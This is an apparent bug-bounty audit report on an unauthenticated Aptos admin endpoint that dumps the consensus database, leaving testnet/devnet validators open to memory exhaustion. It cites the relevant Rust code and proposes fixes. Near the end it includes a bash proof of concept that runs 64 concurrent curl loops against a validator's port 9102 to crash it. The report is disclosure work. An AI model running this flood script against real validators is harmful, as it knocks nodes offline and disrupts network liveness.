# Audit Report

## Title
Unauthenticated Admin Endpoint Allows Consensus Database Memory Exhaustion Attack on Testnet/Devnet Validators

## Summary
The `/debug/consensus/consensusdb` admin endpoint on testnet/devnet validators lacks authentication and rate limiting, allowing attackers to repeatedly force validators to load the entire consensus database into memory, causing OOM crashes and loss of liveness.

## Finding Description

The admin service exposes a debugging endpoint at `/debug/consensus/consensusdb` that dumps the entire consensus database contents. This endpoint has critical security flaws:

**1. Missing Authentication on Testnet/Devnet:** [1](#0-0) 

When `authentication_configs` is empty (the default), authentication is bypassed. The admin service is enabled by default on non-mainnet chains: [2](#0-1) 

**2. Full Database Loading:**
The endpoint handler calls `dump_consensus_db()` which loads ALL blocks and quorum certificates: [3](#0-2) 

This calls `consensus_db().get_data()` which uses `get_all()`: [4](#0-3) 

The `get_all()` method collects the entire database into memory: [5](#0-4) 

**3. No Rate Limiting:**
The endpoint uses `spawn_blocking` with only a global limit of 64 concurrent tasks: [6](#0-5) 

**4. Block Accumulation via Pruning Failures:**
If database pruning fails (disk errors, bugs), blocks accumulate indefinitely because errors are only logged: [7](#0-6) 

**Attack Scenario:**
1. Attacker identifies testnet/devnet validator with admin service enabled (default configuration)
2. Attacker sends concurrent HTTP GET requests to `http://validator:9102/debug/consensus/consensusdb`
3. Each request loads all blocks and QCs into memory via `get_all()` and formats them as strings
4. With pruning failures over extended periods, the consensus DB can contain millions of blocks
5. Even with moderate block counts (thousands), 64 concurrent requests each allocating memory for all blocks causes resource exhaustion
6. Validator experiences memory pressure, OOM kills, crashes → loss of liveness

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos bug bounty program:
- **Validator node slowdowns**: Repeated memory allocation and string formatting degrades performance
- **API crashes**: OOM conditions cause validator process termination
- **Loss of liveness**: Crashed validators cannot participate in consensus

If multiple validators on testnet/devnet are simultaneously attacked, it could cause **CRITICAL** impact (total loss of network availability) as validators repeatedly crash and fail to maintain liveness.

## Likelihood Explanation

**High likelihood** on testnet/devnet validators:
- Admin service enabled by default without authentication
- Endpoint is documented and discoverable via port scanning (9102)
- Attack requires only HTTP client (curl, wget, custom script)
- No special privileges or validator access needed
- Works against any testnet/devnet validator running default configuration

**Low likelihood** on mainnet:
- Admin service disabled by default
- If manually enabled, authentication is enforced by config sanitizer

## Recommendation

Implement multiple defense layers:

**1. Require Authentication for All Admin Endpoints:**
```rust
// In admin_service_config.rs, enforce authentication even on testnet
impl ConfigSanitizer for AdminServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        if node_config.admin_service.enabled == Some(true) {
            // Require authentication on ALL chains, not just mainnet
            if node_config.admin_service.authentication_configs.is_empty() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Authentication required for AdminService on all networks.".into(),
                ));
            }
        }
        Ok(())
    }
}
```

**2. Add Per-Endpoint Rate Limiting:**
```rust
// Use a semaphore to limit concurrent dump operations
use tokio::sync::Semaphore;
use std::sync::Arc;

pub struct Context {
    // ... existing fields ...
    dump_semaphore: Arc<Semaphore>,
}

pub async fn handle_dump_consensus_db_request(
    _req: Request<Body>,
    consensus_db: Arc<dyn PersistentLivenessStorage>,
    semaphore: Arc<Semaphore>,
) -> hyper::Result<Response<Body>> {
    // Limit to 1 concurrent dump operation
    let _permit = match semaphore.try_acquire() {
        Ok(p) => p,
        Err(_) => return Ok(reply_with_status(
            StatusCode::TOO_MANY_REQUESTS,
            "Database dump already in progress"
        )),
    };
    
    // ... rest of existing code ...
}
```

**3. Add Size Limits to Database Dumps:**
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    const MAX_BLOCKS_TO_DUMP: usize = 1000;
    
    let (last_vote, highest_tc, mut consensus_blocks, mut consensus_qcs) =
        consensus_db.consensus_db().get_data()?;
    
    if consensus_blocks.len() > MAX_BLOCKS_TO_DUMP {
        bail!("Too many blocks in database ({} > {}). Use block-specific query instead.",
              consensus_blocks.len(), MAX_BLOCKS_TO_DUMP);
    }
    
    // ... rest of existing code ...
}
```

**4. Fix Pruning Error Handling:** [7](#0-6) 

Change to aggressive retry or halt consensus if pruning repeatedly fails.

## Proof of Concept

```bash
#!/bin/bash
# DoS attack against testnet validator
VALIDATOR_HOST="testnet-validator.example.com"
ADMIN_PORT=9102

echo "Starting memory exhaustion attack..."

# Launch 64 concurrent requests to saturate spawn_blocking thread pool
for i in {1..64}; do
  (
    while true; do
      curl -s "http://${VALIDATOR_HOST}:${ADMIN_PORT}/debug/consensus/consensusdb" \
        > /dev/null
      echo "Request $i completed, restarting..."
    done
  ) &
done

echo "Attack running with 64 concurrent loops. Monitor validator memory usage."
echo "Press Ctrl+C to stop."
wait
```

**Expected Result:**
- Validator memory usage increases rapidly
- After repeated requests over minutes, validator experiences OOM condition
- Validator process crashes or becomes unresponsive
- Consensus participation halts

**To Verify Block Accumulation:**
```bash
# Check consensus DB size over time
du -sh /opt/aptos/data/consensus_db/

# Monitor for pruning failures in logs
grep "fail to delete block" /var/log/aptos/validator.log
```

## Notes

This vulnerability demonstrates a defense-in-depth failure where multiple security controls are missing:
1. No authentication on sensitive debugging endpoints
2. No rate limiting per endpoint
3. No bounds checking on database dump operations
4. Silent pruning failures allowing unbounded growth

While mainnet validators are protected by default configuration, testnet/devnet validators used for development, testing, and ecosystem experimentation are vulnerable to this attack, potentially disrupting critical network infrastructure.

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-156)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
```

**File:** config/src/config/admin_service_config.rs (L93-100)
```rust
        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L130-155)
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    let mut body = String::new();

    let (last_vote, highest_tc, consensus_blocks, consensus_qcs) =
        consensus_db.consensus_db().get_data()?;

    body.push_str(&format!("Last vote: \n{last_vote:?}\n\n"));
    body.push_str(&format!("Highest tc: \n{highest_tc:?}\n\n"));
    body.push_str("Blocks: \n");
    for block in consensus_blocks {
        body.push_str(&format!(
            "[id: {:?}, author: {:?}, epoch: {}, round: {:02}, parent_id: {:?}, timestamp: {}, payload: {:?}]\n\n",
            block.id(),
            block.author(),
            block.epoch(),
            block.round(),
            block.parent_id(),
            block.timestamp_usecs(),
            block.payload(),
        ));
    }
    body.push_str("QCs: \n");
    for qc in consensus_qcs {
        body.push_str(&format!("{qc:?}\n\n"));
    }
    Ok(body)
```

**File:** consensus/src/consensusdb/mod.rs (L80-106)
```rust
    pub fn get_data(
        &self,
    ) -> Result<(
        Option<Vec<u8>>,
        Option<Vec<u8>>,
        Vec<Block>,
        Vec<QuorumCert>,
    )> {
        let last_vote = self.get_last_vote()?;
        let highest_2chain_timeout_certificate = self.get_highest_2chain_timeout_certificate()?;
        let consensus_blocks = self
            .get_all::<BlockSchema>()?
            .into_iter()
            .map(|(_, block)| block)
            .collect();
        let consensus_qcs = self
            .get_all::<QCSchema>()?
            .into_iter()
            .map(|(_, qc)| qc)
            .collect();
        Ok((
            last_vote,
            highest_2chain_timeout_certificate,
            consensus_blocks,
            consensus_qcs,
        ))
    }
```

**File:** consensus/src/consensusdb/mod.rs (L201-205)
```rust
    pub fn get_all<S: Schema>(&self) -> Result<Vec<(S::Key, S::Value)>, DbError> {
        let mut iter = self.db.iter::<S>()?;
        iter.seek_to_first();
        Ok(iter.collect::<Result<Vec<(S::Key, S::Value)>, AptosDbError>>()?)
    }
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** consensus/src/block_storage/block_tree.rs (L591-596)
```rust
        if let Err(e) = storage.prune_tree(ids_to_remove.clone().into_iter().collect()) {
            // it's fine to fail here, as long as the commit succeeds, the next restart will clean
            // up dangling blocks, and we need to prune the tree to keep the root consistent with
            // executor.
            warn!(error = ?e, "fail to delete block");
        }
```
